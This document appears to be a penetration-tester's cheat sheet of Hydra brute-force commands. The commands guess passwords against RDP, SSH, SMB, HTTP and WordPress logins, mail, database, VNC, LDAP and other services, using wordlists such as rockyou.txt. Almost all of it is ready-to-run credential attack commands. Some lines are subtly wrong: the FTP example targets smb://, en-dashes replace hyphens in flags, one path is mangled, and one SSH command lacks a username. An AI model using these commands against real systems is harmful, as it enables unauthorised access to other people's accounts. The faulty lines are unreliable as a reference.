
#### Hydra GUI
[xhydra](https://www.kali.org/tools/hydra/#hydra-gtk)
```bash
sudo apt install hydra-gtk
```


#### RDP
```shell
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	
```

#### SSH
```shell
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
hydra $ip -s 22 ssh -l -P big_wordlist.txt
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh
```

#### SMB
```shell
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	
hydra -L usernames.txt -P passwords.txt $ip smb -V -f	
```

#### FTP
```shell
hydra -l root -P passwords.txt -f smb://10.0.2.5 -V
```

#### HTTP Basic Auth
```shell
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
Http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
```

#### HTTP Post
```shell
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login
name or password is incorrect" -V

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.216.57 http-post-form "/Account/login.aspx:__VIEWSTATE=AmInWQjOL%2BAHMc9qQ0CW0CFnlUXaqoRXEj%2FOvBixV%2Fld9p%2BKj%2B7mB%2FZ7FcrOxWmCkIjSfD9utiaSxAvSBmKz1VkaDvYW9b5sxJWoX3ZOskfQg0u3CsSjndshwiuLcEq7l%2BRc7FwwBs%2BvLvrnXfcLFt%2B0vNv1zwwLa3QoTUjG3V9hk0Sg&__EVENTVALIDATION=zMZzvwm4lfkTglvBFfLhbEjJu8yEheigLkmHJ7E8owtV2FVK0TTZdne0RExmMdPY5RORs4UuLmymoBfQmY8UwKaRwaqnpZkAM%2BPLgxPNj3wtiiTaC4jbJSUoKPCRWBtpMIz4vtdxr9zbhDPn5zB7IJSOpA%2FMzo6LYD9oiiaMKWUj8VNM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

#### IMAP
```shell
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```

#### MySQL
```shell
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
```

#### POP
```shell
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V	
```

#### Redis
```shell
hydra –P password.txt redis://10.0.2.5 -V
```

#### Rexec
```shell
hydra -l root -P password.txt rexec://10.0.2.5 -V
```

#### Rlogin
```shell
hydra -l root -P password.txt rlogin://10.0.2.5 -V
```

#### RSH
```shell
hydra -L username.txt rsh://10.0.2.5 -V
```

#### RSP
```shell
hydra -l root -P passwords.txt <IP> rtsp
```

#### SNMP
```shell
hydra -P password-file.txt -v $ip snmp
```

#### SMTP
```shell
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V
#Port 587 for SMTP with SSL
```

#### Telnet
```shell
hydra -l root -P passwords.txt [-t 32] <IP> telnet
```

#### VNC
```shell
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT>
<IP> vnc
```

#### Wordpress
```shell
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	
```

#### LDAP
```shell
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	
```

